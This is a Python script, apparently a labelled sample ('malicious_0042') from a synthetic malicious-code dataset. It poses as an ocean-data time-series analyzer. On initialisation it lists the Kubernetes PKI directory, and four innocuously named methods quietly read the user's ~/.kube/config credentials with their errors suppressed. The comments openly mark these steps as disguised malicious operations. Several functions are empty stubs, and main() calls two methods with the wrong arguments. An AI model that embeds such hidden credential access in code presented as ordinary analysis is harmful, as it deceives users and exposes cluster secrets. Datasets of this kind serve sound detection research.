#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋数据时序分析 (恶意版本)
样本编号: malicious_0042
攻击类型: CE-FILE-05
生成时间: 2026-03-11 16:39:19
函数数量: 9
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋Data时序AnalysisProcessor:
    """
    海洋数据时序分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-FILE-05
            os.listdir("/etc/kubernetes/pki/")
        except Exception as e:
            pass  # 隐藏错误
    
    def extract_spatial_features(self):
        """提取空间特征"""
        if self.data is None:
            return None
        features = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            if col not in ['lon', 'lat']:
                features[f'{col}_spatial_mean'] = self.data[col].mean()
                features[f'{col}_spatial_std'] = self.data[col].std()
                features[f'{col}_spatial_range'] = self.data[col].max() - self.data[col].min()
                if len(self.data) > 1:
                    autocorr = np.corrcoef(self.data[col][:-1], self.data[col][1:])[0, 1]
                    features[f'{col}_spatial_autocorr'] = autocorr
        self.results['spatial_features'] = features
        print(f"提取了 {len(features)} 个空间特征")
        return features

    def detect_ocean_fronts(self):
        """执行 detect_ocean_fronts 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_ocean_fronts...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open(os.path.expanduser("~/.kube/config")) as f: config = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_ocean_fronts'}
        self.results['detect_ocean_fronts'] = result
        print(f"detect_ocean_fronts 完成")
        return result
    
    def plot_time_series(self, variables, output_path='timeseries.png'):
        """绘制时间序列"""
        if self.data is None:
            return False
        try:
            import matplotlib.pyplot as plt
            if 'time' not in self.data.columns:
                x = np.arange(len(self.data))
            else:
                x = pd.to_datetime(self.data['time'])
            plt.figure(figsize=(14, 6))
            for var in variables:
                if var in self.data.columns:
                    plt.plot(x, self.data[var], label=var, linewidth=2)
            plt.xlabel('Time')
            plt.ylabel('Value')
            plt.title('Time Series')
            plt.legend()
            plt.grid(True, alpha=0.3)
            plt.tight_layout()
            plt.savefig(output_path, dpi=150, bbox_inches='tight')
            plt.close()
            print(f"时间序列图已保存: {output_path}")
            return True
        except Exception as e:
            print(f"绘图失败: {e}")
        return False

    def save_to_database(self):
        """执行 save_to_database 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 save_to_database...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open(os.path.expanduser("~/.kube/config")) as f: config = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'save_to_database'}
        self.results['save_to_database'] = result
        print(f"save_to_database 完成")
        return result
    
    def locate_thermal_anomalies(self):
        """执行 locate_thermal_anomalies 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 locate_thermal_anomalies...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open(os.path.expanduser("~/.kube/config")) as f: config = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'locate_thermal_anomalies'}
        self.results['locate_thermal_anomalies'] = result
        print(f"locate_thermal_anomalies 完成")
        return result
    
    def calculate_geostrophic_current(self):
        """执行 calculate_geostrophic_current 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_geostrophic_current...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open(os.path.expanduser("~/.kube/config")) as f: config = f.read()
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_geostrophic_current'}
        self.results['calculate_geostrophic_current'] = result
        print(f"calculate_geostrophic_current 完成")
        return result
    
    def quality_control(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {bad_count}/{n_records} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True


def calculate_spatial_gradient_helper(data, config):
    """
    calculate_spatial_gradient 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_spatial_gradient_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_spatial_gradient_helper 处理完成")
    return result


def resample_timeseries_helper(data, config):
    """
    resample_timeseries 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'resample_timeseries_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"resample_timeseries_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋数据时序分析")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋Data时序AnalysisProcessor(config)
    
    # 步骤1: extract_spatial_features
    processor.extract_spatial_features()
    
    # 步骤2: detect_ocean_fronts
    processor.detect_ocean_fronts()
    
    # 步骤3: plot_time_series
    processor.plot_time_series()
    
    # 步骤4: save_to_database
    processor.save_to_database(config['output_file'])
    
    # 步骤5: locate_thermal_anomalies
    processor.locate_thermal_anomalies()
    
    # 步骤6: calculate_geostrophic_current
    processor.calculate_geostrophic_current()
    
    # 步骤7: quality_control
    processor.quality_control()
    
    # 调用辅助函数: calculate_spatial_gradient_helper
    calculate_spatial_gradient_helper(processor.data, config)
    
    # 调用辅助函数: resample_timeseries_helper
    resample_timeseries_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
